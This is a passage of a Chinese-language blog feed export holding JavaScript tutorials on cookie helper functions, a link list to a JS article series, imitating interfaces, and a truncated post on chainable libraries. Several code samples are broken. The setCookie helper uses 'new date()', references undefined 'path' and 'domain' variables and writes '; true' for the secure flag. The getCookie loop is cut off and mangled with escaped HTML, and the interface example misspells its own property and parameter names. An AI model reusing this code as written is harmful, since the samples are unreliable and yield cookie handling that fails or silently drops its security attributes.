加了secure（默认值为空），之后，cookie提交到服务器时使用的是https传输。当然这只是加了一层防护，不等于我爱罗的绝对防御~</p><h3>Attention [注意事项]</h3><p>　　<strong>1.value值保护</strong></p><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span>document.cookie = <span class="keyword">name</span> + <span class="string">&quot;=&quot;</span>+ escape (value);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　我们通常会用escape将value进行编码，取回的时候用unescape()函数就行了。</p><p>　　<strong>2.重要信息就不要放到cookie值中了~</strong></p><h3>Class [封装cookie方法的类]</h3><p><span>　　<strong>1、创建Cookie对象</strong></span></p><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span>//因为是作为类名或者命名空间的使用，所以和Math对象类似，这里使用Cookie来表示该对象</span><br><span class="line"><span class="symbol">2 </span>var Cookie = <span class="keyword">new</span> Object();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>　　2、实现设置Cookie的方法</strong></p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"> <span class="number">1</span> //<span class="type">name</span>是要设置cookie的名称；<span class="keyword">value</span>是设置cookie的值，<span class="keyword">option</span>包括了其它选项，是一个对象作为参数</span><br><span class="line"> <span class="number">2</span> Cookie.setCookie = <span class="keyword">function</span>(<span class="type">name</span>, <span class="keyword">value</span>, <span class="keyword">option</span>) &#123;</span><br><span class="line"> <span class="number">3</span>   //用于存储赋值给document.cookie的cookie格式字符串</span><br><span class="line"> <span class="number">4</span>   var str = <span class="type">name</span>+&quot;=&quot;+<span class="keyword">escape</span>(<span class="keyword">value</span>);</span><br><span class="line"> <span class="number">5</span>   <span class="keyword">if</span>(<span class="keyword">option</span>) &#123;</span><br><span class="line"> <span class="number">6</span>     //如果设置了过期时间</span><br><span class="line"> <span class="number">7</span>      <span class="keyword">if</span>(<span class="keyword">option</span>.expireDays) &#123;</span><br><span class="line"> <span class="number">8</span>       var <span class="type">date</span> = <span class="built_in">new</span> <span class="type">date</span>();</span><br><span class="line"> <span class="number">9</span>       var ms = <span class="keyword">option</span>.expireDays*<span class="number">24</span>*<span class="number">3600</span>*<span class="number">1000</span>;</span><br><span class="line"><span class="number">10</span>       <span class="type">date</span>.setTime(<span class="type">date</span>.getTime()+ms);</span><br><span class="line"><span class="number">11</span>       str += &quot;; expires=&quot;+<span class="type">date</span>.toGMTString();</span><br><span class="line"><span class="number">12</span>     &#125;</span><br><span class="line"><span class="number">13</span>     <span class="keyword">if</span>(<span class="keyword">option</span>.path) str += &quot;; path=&quot;+<span class="type">path</span>;//设置访问路径</span><br><span class="line"><span class="number">14</span>      <span class="keyword">if</span>(<span class="keyword">option</span>.<span class="keyword">domain</span>) str += &quot;; domain=&quot;+<span class="keyword">domain</span>;//设置访问主机</span><br><span class="line"><span class="number">15</span>      <span class="keyword">if</span>(<span class="keyword">option</span>.secure) str += &quot;; true&quot;;//设置安全性</span><br><span class="line"><span class="number">16</span>   &#125;</span><br><span class="line"><span class="number">17</span>   document.cookie = str;</span><br><span class="line"><span class="number">18</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><span>　　3、实现取Cookie的方法</span></strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">//name是指定cookie的名称，从而根据名称返回相应的值</span></span><br><span class="line"> <span class="number">2</span> <span class="title class_">Cookie</span>.<span class="property">getCookie</span> = <span class="keyword">function</span>(<span class="params">name</span>) &#123;</span><br><span class="line"> <span class="number">3</span>   <span class="keyword">var</span> cookieArray = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&quot;; &quot;</span>);<span class="comment">//得到分割的cookie名值对</span></span><br><span class="line"> <span class="number">4</span>   <span class="keyword">var</span> cookie = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"> <span class="number">5</span>   <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i</span><br><span class="line">&lt;p&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>　　4、实现删除Cookie的方法<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span>&lt;/p&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 1 &#x2F;&#x2F;name是指定cookie的名称，从而根据这个名称删除相应的cookie。在实现中，删除cookie是通过调用setCookie来完成的，将option的expireDays属性指定为负数即可<br> 2 Cookie.deleteCookie &#x3D; function(name) {<br> 3   this.setCookie(name, “”, {expireDays:-1});&#x2F;&#x2F;将过期时间设置为过去来删除一个cookie<br> 4 }<br> 5 &#x2F;&#x2F;通过下面的代码，整个Cookie对象创建完毕后，可以将其放到一个大括号中来定义：<br> 6 var Cookie &#x3D; {<br> 7    setCookie:function(){},<br> 8    getCookie:function(){},<br> 9    deleteCookie:function(){}<br>10 }<br>11<br>12 &#x2F;&#x2F;通过这种形式，可以让Cookie的功能更加清晰，它作为一个全局对象，大大方便了对Cookie的操作<br>13 Cookie.setCookie(“user”, “terry”);<br>14 Cookie.deleteCookie(“user”);</p><pre><code>&lt;h3&gt;Substitution [cookie的替代品]&lt;/h3&gt;&lt;p&gt;　　&lt;span&gt;cookie 是有大小限制的，每个 cookie 所存放的数据不能超过4kb，如果 cookie 字符串的长度超过4kb，则该属性将返回空字符串。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;　　如果我们需要在客户端储存比较大容量的数据，怎么办？选择cookie肯定是不明智的，下次会给大家详细说明userData和localStorage。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;　　&lt;a title=&quot;MSDN userData&quot; href=&quot;http://msdn.microsoft.com/zh-cn/vstudio/ms531424&quot; target=&quot;_blank&quot;&gt;userData&lt;/a&gt;(windows+IE平台):&amp;nbsp;&lt;strong&gt;128Kb&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;&lt;a title=&quot;wiki localStorage&quot; href=&quot;http://en.wikipedia.org/wiki/Web_storage&quot; target=&quot;_blank&quot;&gt;localStorage&lt;/a&gt;(现代浏览器):&amp;nbsp;&lt;strong&gt;&amp;nbsp;5M&lt;/strong&gt;&lt;/p&gt;&lt;h3&gt;&lt;span&gt;&amp;nbsp;Related blog [相关博文]&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;&lt;span&gt;　　&lt;a class=&quot;titlelink&quot; href=&quot;http://www.cnblogs.com/hustskyking/archive/2013/03/28/javascript-userdata-and-localstorage.html&quot;&gt;JavaScript本地储存（2）：userData和localStorage&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;　　&lt;a class=&quot;titlelink&quot; href=&quot;http://www.cnblogs.com/hustskyking/archive/2013/03/30/javascript-applicationcache.html&quot;&gt;Javascript本地储存（3）：离线web应用&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3&gt;Reference [参考资料]&lt;/h3&gt;&lt;p&gt;　　1.&lt;a title=&quot;百度文库cookie&quot; href=&quot;http://baike.baidu.com/view/835.htm&quot; target=&quot;_blank&quot;&gt;百度文库&lt;/a&gt;&lt;/p&gt;&lt;p&gt;　　2.&lt;a title=&quot;wiki cookie&quot; href=&quot;http://zh.wikipedia.org/wiki/Cookie&quot; target=&quot;_blank&quot;&gt;wiki&lt;/a&gt;&lt;/p&gt;&lt;p&gt;　　3.&lt;a title=&quot;聂微东博客 js操作cookie&quot; href=&quot;http://www.cnblogs.com/Darren_code/archive/2011/11/24/Cookie.html&quot; target=&quot;_blank&quot;&gt;聂微东博客&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;4.&lt;a title=&quot;alixixi&quot; href=&quot;http://www.alixixi.com/web/a/2008050746872.shtml&quot; target=&quot;_blank&quot;&gt;alixixi&lt;/a&gt;&lt;/p&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汤姆大叔的JS系列文章，放在自己家里好找</title>
      <link href="/blog/2013/03/27/%E6%B1%A4%E5%A7%86%E5%A4%A7%E5%8F%94%E7%9A%84JS%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%EF%BC%8C%E6%94%BE%E5%9C%A8%E8%87%AA%E5%B7%B1%E5%AE%B6%E9%87%8C%E5%A5%BD%E6%89%BE/"/>
      <url>/blog/2013/03/27/%E6%B1%A4%E5%A7%86%E5%A4%A7%E5%8F%94%E7%9A%84JS%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%EF%BC%8C%E6%94%BE%E5%9C%A8%E8%87%AA%E5%B7%B1%E5%AE%B6%E9%87%8C%E5%A5%BD%E6%89%BE/</url>
      
        <content type="html"><![CDATA[<h3>汤姆大叔文章列表</h3><p><a href="http://www.cnblogs.com/TomXu/archive/2011/12/28/2286877.html" target="_blank">深入理解JavaScript系列（1）：编写高质量JavaScript代码的基本要点</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2011/12/29/2290308.html" target="_blank">深入理解JavaScript系列（2）：揭秘命名函数表达式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2011/12/30/2288372.html" target="_blank">深入理解JavaScript系列（3）：全面解析Module模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2011/12/31/2289423.html" target="_blank">深入理解JavaScript系列（4）：立即调用的函数表达式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/01/05/2305453.html" target="_blank">深入理解JavaScript系列（5）：强大的原型和原型链</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/01/06/2305513.html" target="_blank">深入理解JavaScript系列（6）：S.O.L.I.D五大原则之单一职责SRP</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/01/09/2306329.html" target="_blank">深入理解JavaScript系列（7）：S.O.L.I.D五大原则之开闭原则OCP</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/01/10/2310244.html" target="_blank">深入理解JavaScript系列（8）：S.O.L.I.D五大原则之里氏替换原则LSP</a></p><div class="cnblogs_Highlighter"><pre class="brush:javascript;gutter:false;">S.O.L.I.D需要加强</pre></div><p><a href="http://www.cnblogs.com/TomXu/archive/2012/01/11/2311956.html" target="_blank">深入理解JavaScript系列（9）：根本没有\JSON对象"这回事！</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/01/12/2308594.html" target="_blank">深入理解JavaScript系列（10）：JavaScript核心（晋级高手必读篇）</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/01/13/2308101.html" target="_blank">深入理解JavaScript系列（11）：执行上下文（Execution Contexts）</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/01/16/2309728.html" target="_blank">深入理解JavaScript系列（12）：变量对象（Variable Object）</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/01/17/2310479.html" target="_blank">深入理解JavaScript系列（13）：This? Yes, this!</a></p><div class="cnblogs_Highlighter"><pre class="brush:javascript;gutter:false;">还需加强。</pre></div><p><a href="http://www.cnblogs.com/TomXu/archive/2012/01/18/2312463.html" target="_blank">深入理解JavaScript系列（14）：作用域链(Scope Chain)</a></p><div class="cnblogs_Highlighter"><pre class="brush:javascript;gutter:false;">还需加强。</pre></div><p><a href="http://www.cnblogs.com/TomXu/archive/2012/01/30/2326372.html" target="_blank">深入理解JavaScript系列（15）：函数（Functions）</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/01/31/2330252.html" target="_blank">深入理解JavaScript系列（16）：闭包（Closures）</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/03/2330295.html" target="_blank">深入理解JavaScript系列（17）：面向对象编程之一般理论</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/06/2330609.html" target="_blank">深入理解JavaScript系列（18）：面向对象编程之ECMAScript实现</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/08/2341439.html" target="_blank">深入理解JavaScript系列（19）：求值策略</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/10/2342098.html" target="_blank">深入理解JavaScript系列（20）：《你真懂JavaScript吗？》答案详解</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/14/2330137.html" target="_blank">深入理解JavaScript系列（21）：S.O.L.I.D五大原则之接口隔离原则ISP</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/15/2330143.html" target="_blank">深入理解JavaScript系列（22）：S.O.L.I.D五大原则之依赖倒置原则DIP</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/16/2351331.html" target="_blank">深入理解JavaScript系列（23）：JavaScript与DOM（上）&mdash;&mdash;也适用于新手</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/17/2351938.html" target="_blank">深入理解JavaScript系列（24）：JavaScript与DOM（下</a>）</p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/20/2352817.html" target="_blank">深入理解JavaScript系列（25）：设计模式之单例模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/21/2352994.html" target="_blank">深入理解JavaScript系列（26）：设计模式之构造函数模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/22/2353341.html" target="_blank">深入理解JavaScript系列（27）：设计模式之建造者模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/23/2353389.html" target="_blank">深入理解JavaScript系列（28）：设计模式之工厂模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/24/2353434.html" target="_blank">深入理解JavaScript系列（29）：设计模式之装饰者模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/28/2353448.html" target="_blank">深入理解JavaScript系列（30）：设计模式之外观模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/02/29/2354979.html" target="_blank">深入理解JavaScript系列（31）：设计模式之代理模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/03/02/2355128.html" target="_blank">深入理解JavaScript系列（32）：设计模式之观察者模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/03/05/2358552.html" target="_blank">深入理解JavaScript系列（33）：设计模式之策略模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/03/08/2358593.html" target="_blank">深入理解JavaScript系列（34）：设计模式之命令模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/03/09/2358903.html" target="_blank">深入理解JavaScript系列（35）：设计模式之迭代器模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/03/13/2374789.html" target="_blank">深入理解JavaScript系列（36）：设计模式之中介者模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/04/09/2379774.html">深入理解JavaScript系列（37）：设计模式之享元模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/04/10/2435381.html" target="_blank">深入理解JavaScript系列（38）：设计模式之职责链模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/04/11/2435452.html" target="_blank">深入理解JavaScript系列（39）：设计模式之适配器模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/04/12/2435530.html" target="_blank">深入理解JavaScript系列（40）：设计模式之组合模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/04/13/2436371.html" target="_blank">深入理解JavaScript系列（41）：设计模式之模板方法</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/04/16/2436460.html" target="_blank">深入理解JavaScript系列（42）：设计模式之原型模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/04/18/2437099.html" target="_blank">深入理解JavaScript系列（43）：设计模式之状态模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/04/19/2437321.html" target="_blank">深入理解JavaScript系列（44）：设计模式之桥接模式</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/04/23/2438005.html" target="_blank">深入理解JavaScript系列（45）：代码复用模式（避免篇）</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/04/24/2438050.html" target="_blank">深入理解JavaScript系列（46）：代码复用模式（推荐篇）</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/04/25/2439527.html" target="_blank">深入理解JavaScript系列（47）：对象创建模式（上篇）</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/04/26/2443010.html" target="_blank">深入理解JavaScript系列（48）：对象创建模式（下篇）</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/07/23/2580701.html" target="_blank">深入理解JavaScript系列（49）：Function模式（上篇</a>）</p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/07/24/2581239.html" target="_blank">深入理解JavaScript系列（50）：Function模式（下篇）</a></p><p><a href="http://www.cnblogs.com/TomXu/archive/2012/07/26/2581268.html" target="_blank">深入理解JavaScript系列（结局篇）</a></p><p>原文地址：http://www.cnblogs.com/TomXu/archive/2011/12/15/2288411.html</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Javascript中模仿接口（一）</title>
      <link href="/blog/2012/09/22/%E5%9C%A8Javascript%E4%B8%AD%E6%A8%A1%E4%BB%BF%E6%8E%A5%E5%8F%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/blog/2012/09/22/%E5%9C%A8Javascript%E4%B8%AD%E6%A8%A1%E4%BB%BF%E6%8E%A5%E5%8F%A3%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><strong>&nbsp;本文从ITeye导入</strong></p><p>在JavaScript中模仿接口&mdash;&mdash;本文摘自《JavaScript设计模式》</p><p><strong>一、用注释描述接口</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    interface Composite &#123;</span></span><br><span class="line"><span class="comment">        function add(child);</span></span><br><span class="line"><span class="comment">        function remove(child);</span></span><br><span class="line"><span class="comment">        function getChild(index);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    interface FormItem &#123;</span></span><br><span class="line"><span class="comment">        function save();</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">CompositeForm</span> = <span class="keyword">function</span>(<span class="params">id, method, action</span>)&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Implement the Composite interface.</span></span><br><span class="line"><span class="title class_">CompositeForm</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">add</span> = <span class="keyword">function</span>(<span class="params">child</span>)&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">CompositeForm</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">remove</span> = <span class="keyword">function</span>(<span class="params">child</span>)&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">CompositeForm</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">getChild</span> = <span class="keyword">function</span>(<span class="params">index</span>)&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">///Implement the FormItem interface.</span></span><br><span class="line"><span class="title class_">CompositeForm</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">save</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种模仿并不是很好，他们有为确保CompositeForm真正实现正确的方法集而进行检查，</p><p>也不会跑出错误以高质程序员程序中的问题。</p><p><strong>二、用属性检查模仿接口</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        interface Composite &#123;</span></span><br><span class="line"><span class="comment">            function add(child);</span></span><br><span class="line"><span class="comment">            function remove(child);</span></span><br><span class="line"><span class="comment">            function getChild(index);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        interface FormItem &#123;</span></span><br><span class="line"><span class="comment">            function save();</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">CompositeForm</span> = <span class="keyword">function</span>(<span class="params">id, method, action</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">implementsInterfaces</span> = [<span class="string">&#x27;Composite&#x27;</span>, <span class="string">&#x27;FormItem&#x27;</span>];</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addForm</span>(<span class="params">formInstance</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_">implements</span>(formInstance, <span class="string">&#x27;Composite&#x27;</span>, <span class="string">&#x27;FormItem&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Object does not implement a required interface&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//The implements function, which checks to see if an object delcares that it</span></span><br><span class="line">    <span class="comment">//implements the required interfaces.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">implements</span>(<span class="params">object</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">var</span> interfaceName = <span class="variable language_">arguments</span>[i];</span><br><span class="line">            <span class="keyword">var</span> interfaceFound = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; object.<span class="property">implementsInterface</span>.<span class="property">length</span>; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(object.<span class="property">implementsInterface</span>[j] == interfaceName)&#123;</span><br><span class="line">                    interfaceFound = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!interfaceFound)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//An interface was not found.</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//All interface were found.</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个例子中，CompositeForm宣传自己实现了Composite和FormItem这两个接口，其做法是吧这链各个接口的</p><p>名称加入一个名为implement上Interfaces的数组。</p><p><strong>三、用鸭式辨型模仿接口</strong></p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Interfaces</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> composite = <span class="keyword">new</span> Interface(<span class="string">&#x27;Composite&#x27;</span>, [<span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;remove&#x27;</span>, <span class="string">&#x27;getChild&#x27;</span>]);</span><br><span class="line"><span class="keyword">var</span> FormItem = <span class="keyword">new</span> Interface(<span class="string">&#x27;FormItem&#x27;</span>, [<span class="string">&#x27;save&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//CompositeForm class</span></span><br><span class="line"><span class="keyword">var</span> CompositeForm = <span class="keyword">function</span><span class="params">(id, method, action)</span>&#123;</span><br><span class="line">    <span class="comment">//........</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addForm</span><span class="params">(formInstancd)</span>&#123;</span><br><span class="line">    ensureImplements(formInstance, Composite, FormItem);</span><br><span class="line">    <span class="comment">//........</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>&nbsp;</span></p><p>待续......</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何设计一个支持方法链式调用的JavaScript库</title>
      <link href="/blog/2012/09/18/%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E6%94%AF%E6%8C%81%E6%96%B9%E6%B3%95%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E7%9A%84JavaScript%E5%BA%93/"/>
      <url>/blog/2012/09/18/%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E6%94%AF%E6%8C%81%E6%96%B9%E6%B3%95%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E7%9A%84JavaScript%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p><strong>本文从ITeye导入</strong></p><p>可以先了解下&nbsp;<a class="titlelink" href="http://www.cnblogs.com/hustskyking/archive/2012/09/18/3049802.html">javascript链式调用的实现方式</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">//设计一个支持方法链式调用的JavaScript库</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">    常见于大多数JavaScript库中的特性</span><br><span class="line"> <span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span></span><br><span class="line">       特性          |                       说明</span><br><span class="line"> <span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span 